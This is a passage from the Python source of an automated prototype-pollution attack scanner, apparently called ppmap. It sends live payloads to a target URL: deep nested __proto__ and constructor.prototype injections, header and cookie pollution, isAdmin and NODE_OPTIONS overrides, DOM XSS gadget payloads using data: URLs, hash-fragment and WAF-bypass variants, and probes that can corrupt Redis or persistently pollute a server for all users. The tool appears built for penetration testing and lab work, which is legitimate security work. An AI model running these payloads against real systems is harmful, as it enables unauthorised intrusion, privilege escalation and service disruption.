                                self.driver.switch_to.alert.accept()
                            except:
                                pass
                        except Exception as e:
                            logger.debug(f"Ignored error: {type(e).__name__} - {e}")
                            
        except UnexpectedAlertPresentException:
            pass
        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Error testing POST parameters: {str(e)[:50]}{Colors.ENDC}"
            )

        if not findings:
            print(f"{Colors.GREEN}[✓] No POST vulnerabilities detected{Colors.ENDC}")
        return findings

    def test_deep_chain_pollution(self, base_url: str) -> List[Dict[str, Any]]:
        """Phase 9: Fuzz endpoints with multi-level nested prototype injection."""
        print(f"{Colors.BLUE}[*] Testing Deep Chain Prototype Pollution...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        marker = f"dyn_deep_{int(time.time())}_{random.randint(1000,9999)}"
        
        deep_payloads = [
            {"__proto__": {"config": {"request": {"url": marker}}}},
            {"constructor": {"prototype": {"options": {"headers": {"test": marker}}}}},
            {"__proto__": {"data": {"user": {"isAdmin": marker}}}},
            {"constructor": {"prototype": {"env": {"NODE_OPTIONS": marker}}}}
        ]
        
        for payload in deep_payloads:
            try:
                response = self.session.post(base_url, json=payload, timeout=5, verify=False)
                self.metrics.total_requests += 1
                if marker in response.text:
                    findings.append({
                        "type": "deep_chain_pp",
                        "severity": "CRITICAL",
                        "payload": payload,
                        "verified": True,
                        "description": "Deep Chain Object Pollution successfully breached parsing boundaries."
                    })
                    print(f"{Colors.FAIL}[!] DEEP CHAIN PP FOUND: {payload}{Colors.ENDC}")
            except Exception as e:
                logger.debug(f"Deep chain test error: {e}")
                
        if not findings:
            print(f"{Colors.GREEN}[✓] No Deep Chain Prototype Pollution detected.{Colors.ENDC}")
        return findings

    def test_http_header_pollution(self, base_url: str) -> List[Dict[str, Any]]:
        """Phase 9: Fuzz endpoints via HTTP Header Prototype Pollution injection."""
        print(f"{Colors.BLUE}[*] Testing HTTP Header Prototype Pollution...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        marker = f"dyn_hdr_{int(time.time())}_{random.randint(1000,9999)}"
        
        test_headers = [
            {"__proto__[admin]": "true", "X-Forwarded-For": "127.0.0.1"},
            {"__proto__.polluted": marker, "Content-Type": "application/json"},
            {"Cookie": f"__proto__[auth]={marker}"}
        ]
        
        for headers in test_headers:
            try:
                # Merge with session headers to not lose User-Agent, etc.
                merged_headers = self.session.headers.copy()
                merged_headers.update(headers)
                
                response = self.session.get(base_url, headers=merged_headers, timeout=5, verify=False)
                self.metrics.total_requests += 1
                
                if marker in response.text or "Error establishing a Redis connection" in response.text:
                    findings.append({
                        "type": "http_header_pp",
                        "severity": "HIGH",
                        "payload": headers,
                        "verified": True,
                        "description": "HTTP Header Parser is vulnerable to Prototype Pollution."
                    })
                    print(f"{Colors.FAIL}[!] HTTP HEADER PP FOUND: {headers}{Colors.ENDC}")
            except Exception as e:
                logger.debug(f"Header pollution test error: {e}")
                
        if not findings:
            print(f"{Colors.GREEN}[✓] No HTTP Header Prototype Pollution detected.{Colors.ENDC}")
        return findings

    def test_server_side_prototype_pollution(
        self, base_url, request_data=None
    ) -> List[Dict[str, Any]]:
        """Test for server-side Prototype Pollution via direct JavaScript execution on Object.prototype"""
        print(
            f"{Colors.CYAN}[→] Testing Server-Side Prototype Pollution...{Colors.ENDC}"
        )

        findings: List[Dict[str, Any]] = []

        try:
            # Generate unique marker untuk mencegah collision
            marker = f"pp_vuln_{int(time.time())}_{random.randint(1000, 9999)}"

            # Test 1: Client-side PP via jQuery deep merge (jika jQuery ada)
            test_payloads_client = [
                {
                    "name": "jQuery $.extend() Pollution",
                    "payload": {"__proto__": {marker: True}},
                    "verification": f"return Object.prototype['{marker}'] === true;",
                },
                {
                    "name": "Constructor.prototype Pollution",
                    "payload": {"constructor": {"prototype": {marker: "polluted"}}},
                    "verification": f"return Object.prototype['{marker}'] === 'polluted';",
                },
                {
                    "name": "isAdmin Escalation",
                    "payload": {"__proto__": {"isAdmin": True}},
                    "verification": "return Object.prototype.isAdmin === true;",
                },
                {
                    "name": "Debug Mode Activation",
                    "payload": {"__proto__": {"debug": True}},
                    "verification": "return Object.prototype.debug === true;",
                },
            ]

            # Test via browser JavaScript (client-side)
            for test_payload_info in test_payloads_client:
                try:
                    payload = test_payload_info["payload"]
                    verification_script = test_payload_info["verification"]

                    # Inject payload ke JavaScript context via $.extend jika jQuery ada
                    inject_script = f"""
                    try {{
                        if (typeof jQuery !== 'undefined') {{
                            $.extend(true, {{}}, {json.dumps(payload)});
                        }} else {{
                            Object.assign(Object.prototype, {json.dumps(payload)});
                        }}
                    }} catch(e) {{
                        return false;
                    }}
                    {verification_script}
                    """

                    result = self.driver.execute_script(inject_script)

                    if result is True:
                        print(
                            f"{Colors.FAIL}[!] Server-Side PP DETECTED: {test_payload_info['name']}{Colors.ENDC}"
                        )
                        findings.append(
                            {
                                "type": "server_side_pp",
                                "name": test_payload_info["name"],
                                "payload": payload,
                                "severity": "CRITICAL",
                                "method": "Client-side Object.prototype",
                                "verified": True,
                            }
                        )
                except Exception as e:
                    logger.debug(f"Ignored error: {type(e).__name__} - {e}")

            # Test 2: Server-side PP via query string parameters
            test_params = ["data", "json", "payload", "input", "params", "query"]

            iterator = (
                tqdm(test_params, desc="Testing SSPP Params", unit="param")
                if tqdm
                else test_params
            )
            for param_name in iterator:
                try:
                    # Test dengan marker yang unik
                    test_payload_str = json.dumps({"__proto__": {marker: "polluted"}})
                    test_url = f"{base_url}?{param_name}={urllib.parse.quote(test_payload_str)}"

                    # Baca response
                    response = self.session.get(test_url, timeout=5, verify=False)
                    self.metrics.total_requests += 1

                    # Cek apakah server merespons dengan indikasi PP
                    # Cek apakah server merespons dengan indikasi PP
                    if "Error establishing a Redis connection" in response.text or marker in response.text or "polluted" in response.text:
                        print(
                            f"{Colors.FAIL}[!] Server-Side PP FOUND: Parameter '{param_name}'{Colors.ENDC}"
                        )
                        findings.append(
                            {
                                "type": "server_side_pp",
                                "param": param_name,
                                "method": "GET Query String",
                                "url": test_url,
                                "severity": "CRITICAL",
                                "verified": True,
                                "evidence": (
                                    "Redis connection error"
                                    if "Redis" in response.text
                                    else "Reflected marker"
                                ),
                            }
                        )
                except:
                    pass

            # Test 3: Server-side PP via POST JSON
            try:
                test_payload_post = {
                    "__proto__": {marker: True},
                    "constructor": {"prototype": {marker: "exploited"}},
                }

                response = self.session.post(
                    base_url, json=test_payload_post, timeout=5, verify=False
                )

                # Cek response untuk tanda PP
                # Cek response untuk tanda PP
                if "Error establishing a Redis connection" in response.text or marker in response.text or "exploited" in response.text:
                    print(
                        f"{Colors.FAIL}[!] Server-Side PP FOUND: POST JSON Body{Colors.ENDC}"
                    )
                    findings.append(
                        {
                            "type": "server_side_pp",
                            "method": "POST JSON Body (Generic)",
                            "payload": test_payload_post,
                            "severity": "CRITICAL",
                            "evidence": (
                                "Redis connection error"
                                if "Redis" in response.text
                                else "Reflected marker"
                            ),
                        }
                    )
            except:
                pass

        except Exception as e:
            logger.debug(f"Ignored error: {type(e).__name__} - {e}")

        # Test 4: Burp Request Injection (if provided)
        if request_data:
            print(
                f"{Colors.BLUE}[*] Testing via Burp Request Injection...{Colors.ENDC}"
            )
            sspp_payloads = get_sspp_payloads()

            # Baseline request (original)
            try:
                print("[+] Sending baseline request...")
                method = request_data["method"]
                url = request_data["url"]

                # Note: headers are already in session if user did --request
                if request_data.get("body"):
                    baseline_resp = self.session.request(
                        method, url, data=request_data["body"], verify=False
                    )
                else:
                    baseline_resp = self.session.request(method, url, verify=False)

                baseline_text = baseline_resp.text
                print(
                    f"[+] Baseline status: {baseline_resp.status_code}, Length: {len(baseline_text)}"
                )

                iterator = (
                    tqdm(sspp_payloads, desc="Testing SSPP Payloads", unit="payload")
                    if tqdm
                    else sspp_payloads
                )
                for name, payload, detection_method, desc in iterator:
                    # Inject payload
                    injected_req = inject_pp_payload(request_data, payload, "body")

                    # Send
                    # print(f"    Testing {name}...")
                    resp = self.session.request(
                        injected_req["method"],
                        injected_req["url"],
                        data=injected_req["body"],
                        verify=False,
                    )
                    self.metrics.total_requests += 1

                    # Global Check for Redis Errors (DoS)
                    if (
                        "Error establishing a Redis connection" in resp.text
                        or "Redis exception" in resp.text
                    ):
                        print(
                            f"{Colors.FAIL}[!] CRITICAL: Redis Corruption/DoS detected!{Colors.ENDC}"
                        )
                        findings.append(
                            {
                                "type": "server_side_pp",
                                "method": f"Redis DoS - {name}",
                                "payload": payload,
                                "severity": "CRITICAL",
                                "evidence": "Redis connection error in response",
                            }
                        )

                    # Compare
                    diff = compare_responses(baseline_text, resp.text)

                    # 1. Check for JSON spaces (specific detection)
                    if (
                        detection_method == "json_spaces"
                        and diff["json_spaces_changed"]
                    ):
                        print(
                            f"{Colors.FAIL}[!] SSPP DETECTED: {name} (JSON Spaces Change){Colors.ENDC}"
                        )
                        findings.append(
                            {
                                "type": "server_side_pp",
                                "method": f"Burp Injection - {name}",
                                "payload": payload,
                                "evidence": "JSON spaces changed in response",
                            }
                        )

                    # 2. Check for Status Code Override
                    elif detection_method == "status_code":
                        # Payload often sets status: 510 or similar
                        # If response status matches payload status (e.g. 510)
                        target_status = payload["__proto__"].get("status") or payload[
                            "__proto__"
                        ].get("statusCode")
                        if target_status and resp.status_code == target_status:
                            print(
                                f"{Colors.FAIL}[!] SSPP DETECTED: {name} (Status Code Override: {resp.status_code}){Colors.ENDC}"
                            )
                            findings.append(
                                {
                                    "type": "server_side_pp",
                                    "method": f"Burp Injection - {name}",
                                    "payload": payload,
                                    "evidence": f"Status code overridden to {resp.status_code}",
                                }
                            )

                    # 3. Check for general pollution indicators
                    elif diff["pollution_detected"]:
                        print(
                            f"{Colors.FAIL}[!] SSPP DETECTED: {name} (Response Anomalies){Colors.ENDC}"
                        )
                        findings.append(
                            {
                                "type": "server_side_pp",
                                "method": f"Burp Injection - {name}",
                                "payload": payload,
                                "evidence": diff,
                            }
                        )

            except Exception as e:
                print(f"{Colors.WARNING}[⚠] Error in injection test: {e}{Colors.ENDC}")

            # Test 4: Random agent parameter injection (untuk framework specific)
            random_agents = [
                "__proto__[constructor][prototype][randomKey]=injected",
                "constructor.prototype.randomKey=injected",
                "isAdmin=true&__proto__[isAdmin]=true",
                "debug=true&__proto__[debug]=true",
            ]

            for agent in random_agents:
                try:
                    # Test sebagai URL-encoded query string
                    test_url = f"{base_url}?{agent}"
                    response = self.session.get(test_url, timeout=5, verify=False)

                    if response.status_code < 400 and (
                        "randomKey" in response.text
                        or "injected" in response.text
                        or "isAdmin" in response.text
                    ):
                        print(
                            f"{Colors.WARNING}[⚠] Potential PP via agent parameter: {agent[:50]}{Colors.ENDC}"
                        )
                        findings.append(
                            {
                                "type": "server_side_pp",
                                "method": "Random Agent Injection",
                                "agent": agent,
                                "severity": "HIGH",
                                "verified": False,
                            }
                        )
                except:
                    pass

        if not findings:
            print(f"{Colors.GREEN}[✓] No server-side PP detected{Colors.ENDC}")
        return findings

    def detect_gadget_type(self, page_source, js_files=None):
        """
        Analyze page source to detect what type of gadget is present.
        Returns priority payloads based on detected patterns.

        Gadget Types:
        1. DESCRIPTOR - Object.defineProperty used → only value/writable/configurable/get/set work
        2. DIRECT - Direct property access → transport_url/src/href/baseUrl work
        3. EVENT - Event handler assignment → onload/onclick/onerror work
        """
        gadget_info = {
            "type": "UNKNOWN",
            "descriptor_detected": False,
            "direct_sinks": [],
            "event_sinks": [],
            "priority_payloads": [],
        }

        # Combine page source with JS files
        all_js = page_source or ""
        if js_files:
            all_js += "\n".join(js_files)

        # Pattern 1: Object.defineProperty detection (DESCRIPTOR gadget)
        defineproperty_patterns = [
            r"Object\.defineProperty\s*\(",
            r"Object\.defineProperties\s*\(",
            r"Reflect\.defineProperty\s*\(",
            r"{\s*configurable\s*:",
            r"{\s*writable\s*:",
            r"{\s*enumerable\s*:",
        ]

        for pattern in defineproperty_patterns:
            if re.search(pattern, all_js, re.IGNORECASE):
                gadget_info["type"] = "DESCRIPTOR"
                gadget_info["descriptor_detected"] = True
                # Only descriptor properties work for this gadget!
                gadget_info["priority_payloads"] = [
                    ("__proto__[value]", "data:,alert(1)//"),
                    ("__proto__[value]", "data:,alert(document.domain)//"),
                    ("constructor[prototype][value]", "data:,alert(1)//"),
                    ("__proto__[writable]", "true"),
                    ("__proto__[configurable]", "true"),
                ]
                break

        # Pattern 2: Direct property sinks (transport_url, src, href)
        direct_sink_patterns = {
            "transport_url": r"\.transport_url|config\.transport_url|options\.transport_url",
            "src": r"\.src\s*=|script\.src|img\.src|iframe\.src",
            "href": r"\.href\s*=|location\.href",
            "url": r"\.url\s*=|config\.url|options\.url",
            "baseUrl": r"\.baseUrl|config\.baseUrl",
            "data": r"\.data\s*=|config\.data",
        }

        for sink_name, pattern in direct_sink_patterns.items():
            if re.search(pattern, all_js, re.IGNORECASE):
                gadget_info["direct_sinks"].append(sink_name)

        # Pattern 3: Event handler sinks
        event_handler_patterns = {
            "onload": r"\.onload\s*=",
            "onclick": r"\.onclick\s*=",
            "onerror": r"\.onerror\s*=",
            "onmouseover": r"\.onmouseover\s*=",
        }

        for event_name, pattern in event_handler_patterns.items():
            if re.search(pattern, all_js, re.IGNORECASE):
                gadget_info["event_sinks"].append(event_name)

        # Pattern 4: Fetch API sinks (won't execute javascript: URLs) - v3.6
        fetch_api_patterns = {
            "fetch": r"fetch\s*\(",
            "XMLHttpRequest": r"XMLHttpRequest",
            "axios": r"axios\.",
            "Request": r"new\s+Request\s*\(",
            "navigator.sendBeacon": r"navigator\.sendBeacon",
        }

        gadget_info["fetch_sinks"] = []
        for api_name, pattern in fetch_api_patterns.items():
            if re.search(pattern, all_js, re.IGNORECASE):
                gadget_info["fetch_sinks"].append(api_name)

        # Warn if Fetch API is primary sink (javascript: won't work)
        if gadget_info["fetch_sinks"] and not gadget_info["direct_sinks"]:
            gadget_info["fetch_api_warning"] = True
            print(
                f"{Colors.WARNING}[⚠] Fetch API detected: {', '.join(gadget_info['fetch_sinks'])}{Colors.ENDC}"
            )
            print(
                f"{Colors.YELLOW}    → javascript: URLs will NOT execute via Fetch API{Colors.ENDC}"
            )
            print(
                f"{Colors.BLUE}    → Try data exfiltration or redirect-based payloads instead{Colors.ENDC}"
            )

        # Build priority payloads based on detected gadget
        if gadget_info["type"] != "DESCRIPTOR":
            # Use detected sinks for priority payloads
            for sink in gadget_info["direct_sinks"]:
                gadget_info["priority_payloads"].append(
                    (f"__proto__[{sink}]", "data:,alert(1)//")
                )
            for event in gadget_info["event_sinks"]:
                gadget_info["priority_payloads"].append(
                    (f"__proto__[{event}]", "alert(1)")
                )

        return gadget_info

    def test_dom_xss_with_pp(self, target_url) -> List[Dict[str, Any]]:
        """Test DOM-based XSS with Prototype Pollution with smart gadget detection."""
        print(
            f"{Colors.CYAN}[→] Testing DOM-based XSS with Prototype Pollution...{Colors.ENDC}"
        )

        findings: List[Dict[str, Any]] = []

        # Step 1: Fetch page and analyze JavaScript for gadget type
        gadget_info = {
            "type": "UNKNOWN",
            "priority_payloads": [],
            "descriptor_detected": False,
        }
        try:
            resp = self.session.get(target_url, timeout=10, verify=False)
            page_source = resp.text

            # Try to fetch linked JavaScript files
            js_files = []
            js_links = re.findall(
                r'<script[^>]+src=["\']([^"\']+)["\']', page_source, re.IGNORECASE
            )
            for js_link in js_links[:5]:  # Limit to 5 JS files
                try:
                    if js_link.startswith("//"):
                        js_url = "https:" + js_link
                    elif js_link.startswith("/"):
                        js_url = urllib.parse.urljoin(target_url, js_link)
                    elif not js_link.startswith("http"):
                        js_url = urllib.parse.urljoin(target_url, js_link)
                    else:
                        js_url = js_link

                    js_resp = self.session.get(js_url, timeout=5, verify=False)
                    if js_resp.status_code == 200:
                        js_files.append(js_resp.text)
                except:
                    pass

            gadget_info = self.detect_gadget_type(page_source, js_files)

            if gadget_info["descriptor_detected"]:
                print(
                    f"{Colors.YELLOW}[!] Object.defineProperty detected - using DESCRIPTOR payloads only{Colors.ENDC}"
                )
            elif gadget_info["direct_sinks"]:
                print(
                    f"{Colors.BLUE}[*] Detected sinks: {', '.join(gadget_info['direct_sinks'])}{Colors.ENDC}"
                )
        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Gadget detection error: {str(e)[:50]}{Colors.ENDC}"
            )

        # Step 2: Select payloads based on gadget type
        if gadget_info["priority_payloads"]:
            # Use smart payloads based on detected gadget
            dom_xss_payloads = gadget_info["priority_payloads"]
            print(
                f"{Colors.GREEN}[✓] Using {len(dom_xss_payloads)} targeted payloads for detected gadget{Colors.ENDC}"
            )
        else:
            # Fallback: Use all payloads if gadget not detected
            dom_xss_payloads = [
                # Descriptor payloads FIRST (most common in PortSwigger labs)
                ("__proto__[value]", "data:,alert(1)//"),
                ("__proto__[value]", "data:,alert(document.domain)//"),
                ("constructor[prototype][value]", "data:,alert(1)//"),
                # Then direct property payloads
                ("__proto__[transport_url]", "data:,alert(1);"),
                ("__proto__[src]", "data:,alert(1);"),
                ("__proto__[href]", "data:,alert(1);"),
                ("__proto__[url]", "data:,alert(1);"),
                # Event handlers
                ("__proto__[onload]", "alert(1)"),
                ("__proto__[onclick]", "alert(1)"),
            ]

        try:
            for key, payload in dom_xss_payloads:
                try:
                    # Create test URL - IMPORTANT: Don't use quote() for data: URLs
                    if payload.startswith("data:"):
                        # Keep data: URL as-is, only encode the key
                        test_url = f"{target_url}?{key}={payload}"
                    else:
                        test_url = (
                            f"{target_url}?{key}={urllib.parse.quote(payload, safe='')}"
                        )

                    print(
                        f"{Colors.BLUE}[→] Testing: {key}={payload[:50]}...{Colors.ENDC}"
                    )

                    alerts_detected = False

                    try:
                        # Navigate to test URL
                        for attempt in range(3):
                            try:
                                self.driver.get(test_url)
                                break
                            except Exception:
                                if attempt == 2:
                                    raise
                                time.sleep(1)
                        time.sleep(2)  # Wait for data: URL execution

                        # Try to detect alert dialog
                        try:
                            alert_text = self.driver.switch_to.alert.text
                            self.driver.switch_to.alert.accept()
                            alerts_detected = True
                            print(
                                f"{Colors.FAIL}[✓] ALERT DETECTED: '{alert_text}'{Colors.ENDC}"
                            )
                        except Exception as e:
                            logger.debug(f"Ignored error: {type(e).__name__} - {e}")

                        # Check page source for payload traces
                        page_source = self.driver.page_source

                        # Check if prototype was polluted (key or payload in source)
                        # REMOVED: Naive generic check that caused false positives on reflected parameters
                        # if '__proto__' in page_source or 'transport_url' in page_source:
                        #    if not alerts_detected:
                        #        pass

                        # Log browser console for errors (might indicate script execution attempt)
                        try:
                            logs = self.driver.get_log("browser")
                            for log_entry in logs:
                                msg = log_entry.get("message", "").lower()
                                if any(
                                    keyword in msg
                                    for keyword in ["alert", "uncaught", "error"]
                                ):
                                    print(
                                        f"{Colors.BLUE}[→] Browser log: {log_entry.get('message')[:80]}{Colors.ENDC}"
                                    )
                        except:
                            pass

                        # Add finding if alert detected
                        if alerts_detected:
                            findings.append(
                                {
                                    "type": "dom_xss_pp",
                                    "method": "DOM-based XSS via Prototype Pollution (data: URL)",
                                    "key": key,
                                    "payload": payload,
                                    "severity": "CRITICAL",
                                    "verified": True,
                                    "alert_triggered": True,
                                    "test_url": test_url,
                                    "curl_command": f'curl "{test_url}" -v',
                                    "manual_test": f"Visit {test_url} in browser and check for alert box",
                                }
                            )
                            print(
                                f"{Colors.FAIL}[✓✓✓] CRITICAL DOM XSS+PP CONFIRMED: {key}{Colors.ENDC}"
                            )

                    except Exception:
                        # Fallback: Check HTTP response for indicators
                        # REMOVED: HTTP fallback causes false positives on reflected parameters.
                        # Only browser-verified alerts are trusted for DOM XSS.
                        pass

                except Exception as payload_error:
                    print(
                        f"{Colors.WARNING}[⚠] Error testing payload {key}: {str(payload_error)[:50]}{Colors.ENDC}"
                    )

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Error in DOM XSS PP test: {str(e)[:80]}{Colors.ENDC}"
            )

        if findings:
            print(
                f"{Colors.GREEN}[✓] Found {len(findings)} DOM XSS+PP vulnerabilities!{Colors.ENDC}"
            )
        else:
            print(
                f"{Colors.CYAN}[→] No DOM XSS+PP detected via automated testing{Colors.ENDC}"
            )
            print(
                f"{Colors.BLUE}[→] Note: Some data: URL payloads may still be exploitable - test manually in browser!{Colors.ENDC}"
            )

        return findings

    def test_hash_based_pp(self, target_url) -> List[Dict[str, Any]]:
        """
        Test Hash-based Prototype Pollution (WAF Bypass).

        Many WAFs only inspect query parameters (?__proto__) but ignore
        URL hash fragments (#__proto__). This test exploits that gap.

        v3.6 feature - discovered during DomainEsia testing.
        """
        print(
            f"{Colors.CYAN}[→] Testing Hash-based Prototype Pollution (WAF Bypass)...{Colors.ENDC}"
        )

        findings: List[Dict[str, Any]] = []
        marker = f"hashpp_{int(time.time())}"

        # Hash-based PP payloads (bypass WAF that only checks query params)
        hash_payloads = [
            (f"#__proto__[{marker}]=POLLUTED", "basic_pollution"),
            ("#__proto__[url]=javascript:alert(1)", "xss_attempt"),
            (f"#constructor[prototype][{marker}]=POLLUTED", "constructor_bypass"),
        ]

        try:
            for payload, payload_type in hash_payloads:
                try:
                    test_url = target_url + payload
                    print(
                        f"{Colors.BLUE}[→] Testing hash payload: {payload[:50]}...{Colors.ENDC}"
                    )

                    # Navigate to URL with hash payload
                    for attempt in range(3):
                        try:
                            self.driver.get(test_url)
                            break
                        except Exception:
                            if attempt == 2:
                                raise
                            time.sleep(1)
                    time.sleep(3)  # Wait for page and scripts to load

                    # Check 1: Verify Object.prototype is actually polluted
                    try:
                        check_script = (
                            f"return Object.prototype['{marker}'] === 'POLLUTED';"
                        )
                        is_polluted = self.driver.execute_script(check_script)

                        if is_polluted:
                            # Cleanup after verification
                            self.driver.execute_script(
                                f"delete Object.prototype['{marker}'];"
                            )
                            findings.append(
                                {
                                    "type": "hash_based_pp",
                                    "method": "HASH_WAF_BYPASS",
                                    "payload": payload,
                                    "severity": "HIGH",
                                    "description": "Hash-based PP confirmed via Object.prototype check (WAF bypassed)",
                                    "verified": True,
                                    "test_url": test_url,
                                }
                            )
                            print(
                                f"{Colors.FAIL}[!] Hash-based PP DETECTED (Verified): {payload_type}{Colors.ENDC}"
                            )
                    except Exception as e:
                        logger.debug(f"Ignored error: {type(e).__name__} - {e}")

                    # Check 2: Monitor console for TypeError
                    try:
                        logs = self.driver.get_log("browser")
                        for log_entry in logs:
                            msg = log_entry.get("message", "").lower()
                            if any(
                                err in msg
                                for err in [
                                    "typeerror",
                                    "cannot set property",
                                    "only a getter",
                                ]
                            ):
                                findings.append(
                                    {
                                        "type": "hash_based_pp",
                                        "method": "HASH_PP_ERROR",
                                        "payload": payload,
                                        "severity": "MEDIUM",
                                        "console_error": log_entry.get("message", "")[
                                            :100
                                        ],
                                        "verified": True,
                                    }
                                )
                                print(
                                    f"{Colors.WARNING}[!] Hash PP Error: {log_entry.get('message', '')[:50]}{Colors.ENDC}"
                                )
                                break
                    except Exception as e:
                        logger.debug(f"Ignored error: {type(e).__name__} - {e}")

                    # Reset for next test
                    try:
                        self.driver.get(target_url)
                        time.sleep(1)
                    except:
                        pass

                except Exception as e:
                    print(
                        f"{Colors.WARNING}[⚠] Hash payload error: {str(e)[:40]}{Colors.ENDC}"
                    )

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] Hash PP test error: {str(e)[:60]}{Colors.ENDC}")

        if findings:
            print(
                f"{Colors.GREEN}[✓] Found {len(findings)} hash-based PP vulnerabilities!{Colors.ENDC}"
            )
        else:
            print(f"{Colors.GREEN}[✓] No hash-based PP detected{Colors.ENDC}")

        return findings

    def test_with_waf_bypass(self, target_url) -> List[Dict[str, Any]]:
        """Test with WAF bypass techniques (v6 feature)"""
        print(f"{Colors.CYAN}[→] Testing with WAF bypass techniques...{Colors.ENDC}")

        findings: List[Dict[str, Any]] = []

        # Reflection Sanity Check
        rand_ref = f"ref_{int(time.time())}"
        try:
            resp_ref = self.session.get(
                target_url + f"?ppmap_reflect={rand_ref}", timeout=5, verify=False
            )
            if rand_ref in resp_ref.text:
                print(
                    f"{Colors.YELLOW}[!] Target reflects parameters. Skipping WAF Bypass check.{Colors.ENDC}"
                )
                return []
        except:
            pass
        marker = f"bypass_{int(time.time())}"

        # 1. Baseline Check: Verify if WAF is actually active
        # Send a known "bad" payload that should absolutely be blocked by any WAF
        baseline_payload = "<script>alert(1)</script>"
        try:
            from ppmap.engine import WAFDetector, WAFBypassPayloads

            # Try to trigger WAF
            resp_baseline = self.session.get(
                target_url + f"?test={baseline_payload}", timeout=5, verify=False
            )

            if resp_baseline.status_code < 400:
                print(
                    f"{Colors.YELLOW}[!] Baseline checks bypassed (Status {resp_baseline.status_code}). No active WAF or permissive ruleset detected.{Colors.ENDC}"
                )
                print(
                    f"{Colors.GREEN}[✓] Skipping WAF bypass tests (No WAF to bypass){Colors.ENDC}"
                )
                return []
            else:
                block_status = resp_baseline.status_code
                waf_name = WAFDetector.detect(resp_baseline)
                if waf_name:
                    print(
                        f"{Colors.FAIL}[!] WAF Detected: {waf_name} (Status {block_status}){Colors.ENDC}"
                    )
                else:
                    print(
                        f"{Colors.FAIL}[!] Generic WAF/Filter detected (Status {block_status}){Colors.ENDC}"
                    )

                print(
                    f"{Colors.CYAN}[*] Proceeding with WAF bypass techniques...{Colors.ENDC}"
                )

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] WAF detection error: {e}{Colors.ENDC}")
            # Proceed anyway if detection fails
            pass

        # Get bypass payloads
        bypass_payloads = WAFBypassPayloads.get_bypass_payloads(marker)

        try:
            # Test each bypass category
            for category, payloads in bypass_payloads.items():
                if category == "json_payloads":
                    # Test JSON payloads via POST
                    for payload_str in payloads[:3]:
                        try:
                            payload = json.loads(payload_str)
                            resp = self.session.post(
                                target_url, json=payload, timeout=5, verify=False
                            )
                            if resp.status_code < 400:
                                # Double check marker reflection
                                if marker in resp.text:
                                    findings.append(
                                        {
                                            "type": "waf_bypass",
                                            "method": f"JSON_{category}",
                                            "payload": payload_str[:50],
                                            "severity": "HIGH",
                                        }
                                    )
                                    print(
                                        f"{Colors.WARNING}[!] WAF Bypass via JSON: {category}{Colors.ENDC}"
                                    )
                        except:
                            pass
                else:
                    # Test URL payloads
                    for payload in payloads[:2]:
                        try:
                            test_url = target_url + payload
                            resp = self.session.get(test_url, timeout=5, verify=False)
                            if resp.status_code < 400:
                                if marker in resp.text:
                                    findings.append(
                                        {
                                            "type": "waf_bypass",
                                            "method": f"URL_{category}",
                                            "payload": payload[:50],
                                            "severity": "HIGH",
                                        }
                                    )
                                    print(
                                        f"{Colors.WARNING}[!] WAF Bypass via URL: {category}{Colors.ENDC}"
                                    )
                        except:
                            pass
        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] WAF bypass testing error: {str(e)[:50]}{Colors.ENDC}"
            )

        if not findings:
            print(f"{Colors.GREEN}[✓] No WAF bypass detected{Colors.ENDC}")
        return findings

    def test_json_spaces_overflow(self, target_url) -> List[Dict[str, Any]]:
        """
        Blind server-side PP detection via JSON indentation override.
        Sends {"__proto__": {"json spaces": 10}} to check if response formatting changes.
        Works specifically with Express.js servers.
        """
        print(
            f"{Colors.CYAN}[→] Testing blind JSON spaces overflow detection...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []

        try:
            # First request: get baseline response format
            baseline_payload = {"test": "baseline"}
            baseline_resp = self.session.post(
                target_url, json=baseline_payload, timeout=5, verify=False
            )
            baseline_text = baseline_resp.text

            # Count spaces in baseline (for json response formatting)
            baseline_indent = len(baseline_text) - len(baseline_text.lstrip())

            # Second request: inject JSON spaces pollution
            pollution_payload = {
                "__proto__": {"json spaces": 10},  # Force 10-space indentation
                "test": "pollution",
            }

            pollution_resp = self.session.post(
                target_url, json=pollution_payload, timeout=5, verify=False
            )
            pollution_text = pollution_resp.text

            # Count spaces in polluted response
            if "json spaces" in target_url or "express" in target_url.lower():
                # Check if indentation changed significantly
                if (
                    len(pollution_text) > len(baseline_text) * 1.3
                ):  # 30% size increase suggests indentation
                    findings.append(
                        {
                            "type": "blind_pp_detected",
                            "method": "JSON_SPACES_OVERFLOW",
                            "severity": "HIGH",
                            "description": "Server-side PP detected via JSON indentation change",
                            "payload": pollution_payload,
                        }
                    )
                    print(
                        f"{Colors.WARNING}[!] HIGH: Blind PP via JSON spaces overflow detected!{Colors.ENDC}"
                    )

            # Third request: verify persistence (if pollution persists across requests)
            verification_payload = {"verify": "check"}
            verify_resp = self.session.post(
                target_url, json=verification_payload, timeout=5, verify=False
            )

            if len(verify_resp.text) > len(baseline_text) * 1.3:
                findings.append(
                    {
                        "type": "persistent_pp",
                        "method": "JSON_SPACES_PERSISTENCE",
                        "severity": "CRITICAL",
                        "description": "Prototype pollution is PERSISTENT across requests (all users affected)",
                        "payload": pollution_payload,
                    }
                )
                print(
                    f"{Colors.FAIL}[!] CRITICAL: Persistent PP detected - affects all users!{Colors.ENDC}"
                )

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] JSON spaces test error: {str(e)[:80]}{Colors.ENDC}"
            )

        return findings

    def test_status_code_override(self, target_url) -> List[Dict[str, Any]]:
        """
        Blind server-side PP detection via HTTP status code override.
        Sends {"__proto__": {"status": 418}} and triggers an error to check if status changes.
        """
        print(
            f"{Colors.CYAN}[→] Testing status code override detection...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []

        try:
            # Payload to override status code to 418 (I'm a teapot - unusual status)
            pollution_payload = {
                "__proto__": {"status": 418},  # Unusual status code to detect
                "trigger_error": True,  # Try to trigger server error to test status
            }

            resp = self.session.post(
                target_url, json=pollution_payload, timeout=5, verify=False
            )

            # If we get 418 status (or other unusual codes), PP succeeded
            if resp.status_code == 418:
                findings.append(
                    {
                        "type": "status_override_detected",
                        "method": "STATUS_CODE_OVERRIDE",
                        "severity": "HIGH",
                        "description": "Server-side PP detected via HTTP status code override",
